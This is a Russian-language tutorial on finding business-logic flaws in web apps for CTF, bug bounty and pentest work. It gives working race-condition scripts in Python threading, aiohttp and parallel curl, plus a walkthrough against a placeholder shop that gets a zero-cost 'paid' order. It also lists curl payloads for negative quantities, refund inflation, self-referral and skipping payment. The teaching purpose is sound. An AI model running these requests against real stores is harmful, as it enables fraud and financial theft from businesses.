Сканеры уязвимостей не находят баги логики: у них нет модели «как приложение должно работать». Здесь работает только человек, который понимает смысл операций. Логические дыры часто критичны — они позволяют получить товар бесплатно, бесконечно снимать деньги, обойти лимиты или эскалировать права, при этом формально приложение «безопасно».

## Теория: где живёт логика и что ломается

Логические ошибки возникают, когда приложение доверяет клиенту расчёты или проверки, которые должны выполняться на сервере. Основные категории:

1. **Доверие цене/количеству из клиента.** Клиент присылает `price=0.01` или `amount=-100`, сервер не пересчитывает.
2. **Манипуляция скидками/купонами.** Один купон применяется многократно; процент скидки не ограничен; купон стекается с другими.
3. **Обход лимитов.** Бесплатных попыток N, но их можно сбросить/обойти сменой параметра.
4. **Гонки условий (TOCTOU).** Проверка и действие неатомарны: между «проверить баланс» и «списать» можно вставить параллельный запрос.
5. **Шаги процесса (state machine).** Пропуск обязательного шага: оплата не завершена, но заказ уже «выполнен».
6. **Массовое присвоение (mass assignment).** Отправка лишних полей (`is_admin=true`) при обновлении профиля.
7. **Отрицательные значения / переполнение.** `amount=-1` при переводе = пополнение себе.
8. **Целочисленное переполнение / округление** в финансовых расчётах.

Гонка условий особенно важна: HTTP-запросы обрабатываются параллельно, и если сервер делает «прочитал → изменил → записал» без блокировки, два одновременных запроса могут оба «пройти» проверку. Пример: активация купона, снятие денег, использование одноразового токена, «первый раз бесплатно».

## Инструменты: повторяемость и параллелизм

Логика проверяется руками. Главные инструменты:

- **curl / Burp Repeater** — воспроизведение и модификация запросов.
- **Burp Turbo Intruder / `parallel` / `xargs -P` / Python `asyncio`/`threading`** — параллельная отправка для гонок.
- **Python-скрипт** — лучший инструмент для гонок и сложных многошаговых сценариев.

Отправка N параллельных запросов через `xargs`:

```bash
seq 1 20 | xargs -P 20 -I{} curl -s -X POST https://target/api/coupon \
  -b 'session=USER' -d 'code=WELCOME10' -o /dev/null -w '%{http_code}\n'
```

Правильный «race» на Python (все запросы стартуют максимально синхронно):

```python
import threading, requests

url = "https://target/api/redeem"
cookies = {"session": "USER"}
results = []

def hit():
    r = requests.post(url, json={"code": "GIFT"}, cookies=cookies)
    results.append(r.status_code)

threads = [threading.Thread(target=hit) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
print(results)
```

Если из 20 запросов «прошло» больше одного — гонка эксплуатируема. Для более точного выравнивания используют `asyncio` + один `TCPConnector` или Turbo Intruder с `gate`.

## Разобранный пример: бесплатный товар через гонку и манипуляцию ценой

Цель — интернет-магазин `https://shop.example`.

Шаг 1. Изучаем флоу покупки. В корзине видим:

```
POST /api/cart/add   {"item_id":7,"qty":1,"price":49.99}
POST /api/checkout   {"cart_id":42,"coupon":"SAVE10"}
```

Первое подозрение: **цена приходит от клиента**.

Шаг 2. Проверяем манипуляцию ценой — меняем `price` на `0.01`:

```bash
curl -s -X POST https://shop.example/api/cart/add \
  -H 'Content-Type: application/json' -b jar.txt \
  -d '{"item_id":7,"qty":1,"price":0.01}' | jq .
# {"cart_id":42,"total":0.01}  -> сервер доверяет цене!
```

Шаг 3. Проверяем купон: применяем `SAVE10` (10%). Смотрим, можно ли применить многократно. Отправляем 15 параллельных запросов:

```bash
seq 1 15 | xargs -P 15 -I{} curl -s -X POST https://shop.example/api/checkout \
  -H 'Content-Type: application/json' -b jar.txt \
  -d '{"cart_id":42,"coupon":"SAVE10"}' -o /dev/null -w '%{http_code}\n'
```

Шаг 4. Смотрим итоговую корзину:

```bash
curl -s -b jar.txt https://shop.example/api/cart/42 | jq .
# {"total": 0.00, "discount": 100}  -> скидка применилась 15 раз, цена обнулилась
```

Шаг 5. Оформляем заказ на 0.00 и проверяем статус:

```bash
curl -s -X POST https://shop.example/api/checkout/confirm -b jar.txt \
  -d '{"cart_id":42}' | jq .status
# "paid"
```

Флаг на CTF часто выдаётся после «успешной бесплатной покупки» премиум-товара. В реальном bounty это критический отчёт о финансовой потере.

## Другие паттерны для проверки

- **Отрицательное количество:** `qty:-1` в корзине → возврат денег себе.
- **Пропуск шага оплаты:** сразу вызвать `/api/order/complete`.
- **Mass assignment:** `PATCH /api/user {"email":"x","is_premium":true}`.
- **IDOR + логика:** отменить чужой заказ, применив свой купон.
- **Сброс лимита:** удалить/пересоздать сущность, чтобы обнулить счётчик попыток.
- **Переполнение:** очень большое число в поле суммы (`99999999999999999999`).
- **Валютные/округления:** операции с дробными копейками в свою пользу.

## Типичные ошибки новичков

- **Ждать, что сканер найдёт логику.** Не найдёт. Только ручной анализ сценария.
- **Тестировать последовательно там, где нужна гонка.** Гонки проявляются только при параллельной отправке — одиночный запрос всегда «правильно» отклоняется.
- **Слишком мало параллельных запросов.** 2 потока часто не дают гонки; используйте 20–50 и выравнивайте старт.
- **Не читать бизнес-правила.** «Первый заказ со скидкой», «не более 3 попыток» — эти правила надо сначала узнать из UI/документации.
- **Забыть про отрицательные значения.** `-1`, `0`, очень большие числа — базовые проверки, которые часто пропускают.
- **Игнорировать шаги состояния.** Всегда пробуйте вызвать финальный шаг напрямую, минуя предыдущие.
- **Не сохранять доказательства.** Для отчёта нужны точные запросы и наблюдаемый эффект (баланс, статус заказа).

## Инвентаризация бизнес-правил

Бизнес-логику нельзя найти сканером — её нужно понять из поведения приложения. Начните с инвентаризации правил: что можно покупать, сколько, за какую цену, какие есть лимиты, какие шаги у флоу (корзина → заказ → оплата → подтверждение), какие роли и что им разрешено. Для каждого правила задайте вопрос: **что будет, если его нарушить?** Отрицательное количество, нулевая цена, пропуск шага, повторное применение купона, гонка.

```bash
# пример: отрицательное количество
curl -s -b jar -X POST https://t/cart -d 'item=1&qty=-5'
# нулевая/отрицательная цена
curl -s -b jar -X POST https://t/checkout -d 'price=0'
# пропуск шага
curl -s -b jar -X POST https://t/order/confirm -d 'order=1001'   # без оплаты
```

## Гонки: single-packet и limit-overrun

Гонки — самая недооценённая часть бизнес-логики. Идея: отправить несколько запросов **одновременно**, чтобы проверка (баланс, купон, лимит) не успела отработать между ними. Классика — «limit overrun»: применить купон один раз, но десять раз одновременно. **Single-packet attack** (в HTTP/2) позволяет отправить десятки запросов в одном TCP-пакете, минимизируя разброс — это резко повышает надёжность гонки.

```bash
# простой параллелизм (может сработать)
for i in $(seq 1 20); do
  curl -s -b jar -X POST https://t/coupon -d 'code=SAVE10' &
done; wait
# Turbo Intruder (Burp) для single-packet
```

| Техника | Когда | Надёжность |
|---------|-------|-----------|
| параллельные `curl &` | грубая гонка | низкая |
| Turbo Intruder | HTTP/1.1 | средняя |
| single-packet (HTTP/2) | HTTP/2 | высокая |
| last-byte sync | HTTP/1.1 | средняя |

## Что делать дальше / решение

Инвентаризируйте правила, затем атакуйте каждое: манипуляция значениями (отрицательные, дробные, очень большие), пропуск/повтор шагов, гонки на лимитах и балансе, currency rounding, обход проверок состояния. Доводите до артефакта: бесплатный товар, двойное начисление, обход лимита, полученный доступ. Фиксируйте точную последовательность запросов — для гонок важны тайминг и число запросов.

## Другие паттерны бизнес-логики

Помимо цен и гонок, есть набор повторяющихся паттернов. **Возвраты и отмены**: вернуть товар, но оставить бонусы; отменить заказ, но получить доставку; вернуть больше, чем куплено. **Купоны и промокоды**: применить дважды, комбинировать скидки, применить к неподходящему товару, перебрать коды. **Рефералы и бонусы**: начислить себе бонус за собственный реферал, зациклить начисление, обойти лимит. **Лимиты и квоты**: обойти через гонку или через смену параметра. **Workflow-обход**: пропустить оплату, верификацию, согласие; выполнить шаг вне порядка; повторить шаг.

```bash
# возврат больше, чем куплено
curl -s -b jar -X POST https://t/refund -d 'order=1001&amount=9999'
# купон дважды (гонка)
for i in $(seq 1 10); do curl -s -b jar -X POST https://t/coupon -d 'code=SAVE10' & done; wait
# реферал на себя
curl -s -b jar -X POST https://t/refer -d 'ref_code=MYOWN'
# пропуск верификации
curl -s -b jar -X POST https://t/order/confirm -d 'order=1001'
```

## Инструменты для гонок

Для надёжных гонок используйте специализированные инструменты. **Burp Turbo Intruder** с шаблоном single-packet — стандарт. **Python `asyncio`/`aiohttp`** — для кастомных сценариев. **`ffuf`** — для простого параллелизма (но грубого). **`h2spacex`**/`h2-race` — для HTTP/2 single-packet. Ключ — отправить запросы в одном пакете или с минимальным разбросом.

```python
# asyncio-гонка
import asyncio, aiohttp
async def hit(s, url):
    async with s.post(url, data={'code':'SAVE10'}) as r: return await r.text()
async def main():
    async with aiohttp.ClientSession(cookies=COOKIES) as s:
        print(await asyncio.gather(*[hit(s,'https://t/coupon') for _ in range(30)]))
asyncio.run(main())
```

| Инструмент | Назначение | Надёжность |
|------------|-----------|-----------|
| Turbo Intruder | single-packet, HTTP/1.1 | высокая |
| aiohttp/asyncio | кастомные гонки | средняя |
| h2spacex | HTTP/2 single-packet | высокая |
| ffuf | грубый параллелизм | низкая |
| `curl &` | быстрая проба | низкая |

## Что делать дальше / решение

Для каждой бизнес-функции задайте вопрос «что будет, если нарушить правило?» и проверьте: отрицательные/дробные/огромные значения, двойное применение, пропуск/повтор шага, гонки. Подтверждайте артефактом (бесплатный товар, двойное начисление, обход лимита). Для гонок фиксируйте число запросов и метод синхронизации — иначе PoC не воспроизводится. И помните: бизнес-логика — самая «человеческая» уязвимость; сканер её не найдёт, нужен анализ правил.

## Где пригодится

- **CTF (Web):** многие задачи строятся именно на логике — «купить флаг бесплатно», «обойти лимит», «стать премиумом».
- **Bug bounty:** логические дыры в платежах/скидках дают high/critical и часто уникальны (нет дубликатов).
- **Пентест:** проверка бизнес-сценариев — обязательная часть оценки; без неё картина неполна.
- **Работа (AppSec/QA):** тест-кейсы на граничные значения и параллелизм — часть SDLC и threat modeling.
